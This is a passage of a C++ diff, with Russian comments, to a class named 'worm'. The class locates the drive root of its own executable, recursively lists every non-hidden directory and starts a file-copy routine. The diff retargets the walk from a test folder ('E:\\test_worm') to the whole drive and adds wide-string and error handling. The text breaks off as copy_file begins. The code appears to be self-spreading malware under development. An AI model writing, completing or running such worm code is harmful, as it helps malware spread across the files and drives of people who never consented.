@@ -13,8 +13,8 @@ using namespace std;
 namespace fs = std::filesystem;
 
 
-std::string get_own_path();
-std::string get_drive_root_from_path(const std::string& full_path);
+std::wstring get_own_path();
+std::wstring get_drive_root_from_path(const std::wstring& full_path);
 bool is_hidden(const fs::path& path);
 void init_locale();
 // Генератор случайных чисел
@@ -22,50 +22,57 @@ std::string generate_random_suffix();
 // Генератор временной метки
 std::string get_timestamp();
 
+
+
 class worm
 {
 private:
 
-	string path_to_start;
-	vector <string> list_dir;
+	wstring path_to_start;
+	vector <wstring> list_dir;
 	int iteration;
 
 public:
-	worm(const string& path_to_start = get_drive_root_from_path(get_own_path()), int iteration = 2)
+	worm(const wstring& path_to_start = get_drive_root_from_path(get_own_path()), int iteration = 2)
 		: path_to_start(path_to_start), iteration(iteration) {};
 
 
 
-	void search_list_dir(const std::string& path_to_dir) {
-		try {
-			for (const auto& entry : fs::directory_iterator(path_to_dir)) {
-				if (entry.is_directory() && !is_hidden(entry.path())) {
-					std::string dir_path = entry.path().u8string();
-					list_dir.push_back(dir_path);
-					search_list_dir(dir_path);
-				}
+	void search_list_dir(const std::wstring& path_to_dir) {
+		std::error_code ec;
+
+		fs::directory_iterator it(path_to_dir, ec);
+		if (ec) {
+			std::wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
+			return;
+		}
+
+		for (const auto& entry : it) {
+			if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
+				std::wstring dir_path = entry.path().wstring();
+				list_dir.push_back(dir_path);
+				search_list_dir(dir_path);  // рекурсия
 			}
 		}
 
-		catch (const fs::filesystem_error& e) {
-			std::cerr << "Error accessing " << path_to_dir << ": " << e.what() << "\n";
-		}
 		list_dir.push_back(path_to_dir);
 	}
 
+
 	void search_list_dir() {
 		list_dir.clear();
-		search_list_dir("E:\\test_worm");//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
+		search_list_dir(path_to_start);
+		//search_list_dir(L"E:\\test_worm");//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
 	}
 
 	void print_list_dir() {
 		for (auto entry : list_dir) {
-			cout << entry << endl;
+			wcout << entry << endl;
 		}
 	}
 
 	void copy_file() {
-		init_locale();
+		//init_locale();
 		if (list_dir.empty()) {
 			cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
 			return;
